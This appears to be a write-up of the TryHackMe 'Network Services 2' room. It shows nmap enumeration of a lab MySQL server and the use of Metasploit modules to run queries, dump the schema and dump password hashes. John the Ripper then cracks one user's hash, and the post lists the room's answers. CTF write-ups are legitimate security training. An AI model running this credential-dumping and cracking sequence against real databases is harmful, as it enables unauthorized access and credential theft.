![](https://miro.medium.com/max/1400/1*EjFhPAJ5Jw5-jxoDrQ-p4w.png)

This is a writeup for [Network Services 2](https://tryhackme.com/room/networkservices2) room on tryhackme

Enumeration MySQL
=================

Spin up your target machine and let’s do a nmap scan scan to see what ports are open.

```
└─$ sudo nmap -Pn -sV -sC -p- 10.10.75.70    
\[sudo\] password for kali:   
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org) ) at 2022-03-11 09:50 EST  
Nmap scan report for 10.10.75.70  
Host is up (0.41s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 06:36:56:2f:f0:d4:a4:d2:ab:6a:43:3e:c0:f9:9b:2d (RSA)  
|   256 30:bd:be:28:bd:32:dc:f6:ff:28:b2:57:57:31:d9:cf (ECDSA)  
|\_  256 f2:3b:82:4a:5c:d2:18:19:89:1f:cd:92:0a:c7:cf:65 (ED25519)  
3306/tcp open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1  
| mysql-info:   
|   Protocol: 10  
|   Version: 5.7.29-0ubuntu0.18.04.1  
|   Thread ID: 4  
|   Capabilities flags: 65535  
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsCompression, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Support41Auth, ConnectWithDatabase, InteractiveClient, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, LongPassword, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins  
|   Status: Autocommit  
|   Salt: kb%D\\x11\\x05<"F8\\x014T!k\\x10&\\:  
|\_  Auth Plugin Name: mysql\_native\_password  
|\_ssl-date: TLS randomness does not represent time  
| ssl-cert: Subject: commonName=MySQL\_Server\_5.7.29\_Auto\_Generated\_Server\_Certificate  
| Not valid before: 2020-04-23T10:13:27  
|\_Not valid after:  2030-04-21T10:13:27  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernelService detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 1242.55 seconds
```

1.  As always, let’s start out with a port scan, so we know what port the service we’re trying to attack is running on. What port is MySQL using?

```
3306
```

Now let’s try to connect with the database with the username and password provided in the room notes

```
\# mysql -h 10.10.75.70 -u root -p                                                                                                                                                                               
Enter password:   
Welcome to the MariaDB monitor.  Commands end with ; or \\g.  
Your MySQL connection id is 11  
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL \[(none)\]>
```

Use the ‘exit’ command to exit the connection and start metasploit by tying ‘msfconsole’ in your attack machine. Once it’s started use the ‘search’ command to look for a module named ‘mysql\_sql’

```
msf6 > search mysql\_sqlMatching Modules  
\================\#  Name                             Disclosure Date  Rank    Check  Description  
   -  ----                             ---------------  ----    -----  -----------  
   0  auxiliary/admin/mysql/mysql\_sql                   normal  No     MySQL SQL Generic QueryInteract with a module by name or index. For example info 0, use 0 or use auxiliary/admin/mysql/mysql\_sqlmsf6 > use 0  
msf6 auxiliary(admin/mysql/mysql\_sql) > show optionsModule options (auxiliary/admin/mysql/mysql\_sql):Name      Current Setting   Required  Description  
   ----      ---------------   --------  -----------  
   PASSWORD                    no        The password for the specified username  
   RHOSTS                      yes       The target host(s), see [https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit)  
   RPORT     3306              yes       The target port (TCP)  
   SQL       select version()  yes       The SQL to execute.  
   USERNAME                    no        The username to authenticate as
```

Use the show options commands to answer the below question.

2\. Search for, select and list the options it needs. What three options do we need to set? (in descending order).

```
PASSWORD/RHOSTS/USERNAME
```

And we change the settings of the module with ‘set’ command, change the RHOSTS to the attack ip and the PASSWORD to the password in the room notes and USERNAME to the username in the room notes.

```
msf6 auxiliary(admin/mysql/mysql\_sql) > set PASSWORD password  
PASSWORD => password  
msf6 auxiliary(admin/mysql/mysql\_sql) > set RHOSTS 10.10.75.70  
RHOSTS => 10.10.75.70  
msf6 auxiliary(admin/mysql/mysql\_sql) > set USERNAME root  
USERNAME => root  
msf6 auxiliary(admin/mysql/mysql\_sql) > run  
\[\*\] Running module against 10.10.75.70\[\*\] 10.10.75.70:3306 - Sending statement: 'select version()'...  
\[\*\] 10.10.75.70:3306 -  | 5.7.29-0ubuntu0.18.04.1 |  
\[\*\] Auxiliary module execution completed  
msf6 auxiliary(admin/mysql/mysql\_sql) >
```

3\. Run the exploit. By default it will test with the “select version()” command, what result does this give you?

```
5.7.29-0ubuntu0.18.04.1
```

The exploit we just ran use the ‘select version()’ SQL query on the target and now let’s change it to ‘show databases’ with the set command and run the exploit again.

```
msf6 auxiliary(admin/mysql/mysql\_sql) > set SQL show databases  
SQL => show databases  
msf6 auxiliary(admin/mysql/mysql\_sql) > run  
\[\*\] Running module against 10.10.75.70\[\*\] 10.10.75.70:3306 - Sending statement: 'show databases'...  
\[\*\] 10.10.75.70:3306 -  | information\_schema |  
\[\*\] 10.10.75.70:3306 -  | mysql |  
\[\*\] 10.10.75.70:3306 -  | performance\_schema |  
\[\*\] 10.10.75.70:3306 -  | sys |  
\[\*\] Auxiliary module execution completed  
msf6 auxiliary(admin/mysql/mysql\_sql) >
```

4\. Great! We know that our exploit is landing as planned. Let’s try to gain some more ambitious information. Change the “sql” option to “show databases”. how many databases are returned?

```
4
```

Exploiting MySQL
================

👀 Don't forget to read the room notes

Using the ‘search’ command look for a module named ‘mysql\_schemadump’

1.  First, let’s search for and select the “mysql\_schemadump” module. What’s the module’s full name?

```
auxiliary/scanner/mysql/mysql\_schemadump
```

As we did before use the ‘show options’ command to set the required settings for the module and run the exploit.

```
msf6 auxiliary(admin/mysql/mysql\_sql) > search mysql\_schemadumpMatching Modules  
\================\#  Name                                      Disclosure Date  Rank    Check  Description  
   -  ----                                      ---------------  ----    -----  -----------  
   0  auxiliary/scanner/mysql/mysql\_schemadump                   normal  No     MYSQL Schema DumpInteract with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/mysql/mysql\_schemadumpmsf6 auxiliary(admin/mysql/mysql\_sql) > use 0  
msf6 auxiliary(scanner/mysql/mysql\_schemadump) > show optionsModule options (auxiliary/scanner/mysql/mysql\_schemadump):Name             Current Setting  Required  Description  
   ----             ---------------  --------  -----------  
   DISPLAY\_RESULTS  true             yes       Display the Results to the Screen  
   PASSWORD                          no        The password for the specified username  
   RHOSTS                            yes       The target host(s), see [https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit)  
   RPORT            3306             yes       The target port (TCP)  
   THREADS          1                yes       The number of concurrent threads (max one per host)  
   USERNAME                          no        The username to authenticate asmsf6 auxiliary(scanner/mysql/mysql\_schemadump) > set RHOSTS 10.10.75.70  
RHOSTS => 10.10.75.70  
msf6 auxiliary(scanner/mysql/mysql\_schemadump) > set PASSWORD password  
PASSWORD => password  
msf6 auxiliary(scanner/mysql/mysql\_schemadump) > set USERNAME root  
USERNAME => root  
msf6 auxiliary(scanner/mysql/mysql\_schemadump) > run
```

The exploit will give a very large output scroll all the way to the bottom to answer the next question.

```
\- TableName: x$waits\_global\_by\_latency  
    Columns:  
    - ColumnName: events  
      ColumnType: varchar(128)  
    - ColumnName: total  
      ColumnType: bigint(20) unsigned  
    - ColumnName: total\_latency  
      ColumnType: bigint(20) unsigned  
    - ColumnName: avg\_latency  
      ColumnType: bigint(20) unsigned  
    - ColumnName: max\_latency  
      ColumnType: bigint(20) unsigned
```

2\. Great! Now, you’ve done this a few times by now so I’ll let you take it from here. Set the relevant options, run the exploit. What’s the name of the last table that gets dumped?

```
x$waits\_global\_by\_latency
```

Again search for another module called ‘mysql\_hashdump’ and set all the required options and run the exploit.

```
msf6 auxiliary(scanner/mysql/mysql\_schemadump) > search mysql\_hashdumpMatching Modules  
\================\#  Name                                    Disclosure Date  Rank    Check  Description  
   -  ----                                    ---------------  ----    -----  -----------  
   0  auxiliary/scanner/mysql/mysql\_hashdump                   normal  No     MYSQL Password Hashdump  
   1  auxiliary/analyze/crack\_databases                        normal  No     Password Cracker: DatabasesInteract with a module by name or index. For example info 1, use 1 or use auxiliary/analyze/crack\_databasesmsf6 auxiliary(scanner/mysql/mysql\_schemadump) > use 0  
msf6 auxiliary(scanner/mysql/mysql\_hashdump) > show optionsModule options (auxiliary/scanner/mysql/mysql\_hashdump):Name      Current Setting  Required  Description  
   ----      ---------------  --------  -----------  
   PASSWORD                   no        The password for the specified username  
   RHOSTS                     yes       The target host(s), see [https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit)  
   RPORT     3306             yes       The target port (TCP)  
   THREADS   1                yes       The number of concurrent threads (max one per host)  
   USERNAME                   no        The username to authenticate asmsf6 auxiliary(scanner/mysql/mysql\_hashdump) > set PASSWORD password  
PASSWORD => password  
msf6 auxiliary(scanner/mysql/mysql\_hashdump) > set RHOSTS 10.10.75.70  
RHOSTS => 10.10.75.70  
msf6 auxiliary(scanner/mysql/mysql\_hashdump) > set USERNAME root  
USERNAME => root  
msf6 auxiliary(scanner/mysql/mysql\_hashdump) > run
```

3\. Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better… search for and select the “mysql\_hashdump” module. What’s the module’s full name?

```
auxiliary/scanner/mysql/mysql\_hashdump
```

the exploit will output the list of hashes

```
\[+\] 10.10.75.70:3306      - Saving HashString as Loot: root:  
\[+\] 10.10.75.70:3306      - Saving HashString as Loot: mysql.session:\*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE  
\[+\] 10.10.75.70:3306      - Saving HashString as Loot: mysql.sys:\*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE  
\[+\] 10.10.75.70:3306      - Saving HashString as Loot: debian-sys-maint:\*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E  
\[+\] 10.10.75.70:3306      - Saving HashString as Loot: root:\*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19  
\[+\] 10.10.75.70:3306      - Saving HashString as Loot: carl:\*EA031893AA21444B170FC2162A56978B8CEECE18  
\[\*\] 10.10.75.70:3306      - Scanned 1 of 1 hosts (100% complete)  
\[\*\] Auxiliary module execution completed
```

4\. Again, I’ll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?

```
carl
```

5\. What is the user/hash combination string?

```
carl:\*EA031893AA21444B170FC2162A56978B8CEECE18
```

Copy the read the hash along with the username and save it into a text file, we are going to use ‘johntheripper’ to crack it.

```
┌──(kali㉿kali)-\[~\]  
└─$ echo "carl:\*EA031893AA21444B170FC2162A56978B8CEECE18" >> hash.txt                                                                                                                                           1 ⨯  
                                                                                                                                                                                                                      
┌──(kali㉿kali)-\[~\]  
└─$ john hash.txt  
Created directory: /home/kali/.john  
Using default input encoding: UTF-8  
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ \[SHA1 128/128 AVX 4x\])  
Warning: no OpenMP support for this hash type, consider --fork=4  
Proceeding with single, rules:Single  
Press 'q' or Ctrl-C to abort, almost any other key for status  
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.  
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.  
Almost done: Processing the remaining buffered candidate passwords, if any.  
Proceeding with wordlist:/usr/share/john/password.lst  
Proceeding with incremental:ASCII  
doggie           (carl)       
1g 0:00:00:01 DONE 3/3 (2022-03-11 10:56) 0.6756g/s 1544Kp/s 1544Kc/s 1544KC/s doggie..doggin  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

6\. Now, we need to crack the password! Let’s try John the Ripper against it using: “_john hash.txt_” what is the password of the user we found?

```
doggie
```

Now with the password and the username we found, SSH into the target machine and find the flag.

Thank you for reading.
